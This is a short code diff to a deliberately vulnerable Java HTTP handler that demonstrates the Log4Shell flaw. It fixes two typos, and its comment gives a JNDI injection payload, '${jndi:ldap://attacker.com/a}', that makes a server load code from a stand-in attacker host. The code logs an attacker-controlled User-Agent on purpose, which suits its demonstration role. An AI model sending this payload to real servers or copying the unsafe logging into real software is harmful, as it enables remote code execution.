@@ -114,7 +114,7 @@ import java.util.*;
 
 public class VulnerableLog4jExampleHandler implements HttpHandler {
 
-  static Logger log = LogManager.getLogger(log4jExample.class.getName());
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
 
   /**
    * A simple HTTP endpoint that reads the request's User Agent and logs it back.
@@ -122,7 +122,7 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
    * @param he HTTP Request Object
    */
   public void handle(HttpExchange he) throws IOException {
-    string userAgent = he.getRequestHeader("user-agent");
+    String userAgent = he.getRequestHeader("user-agent");
     
     // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
     // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
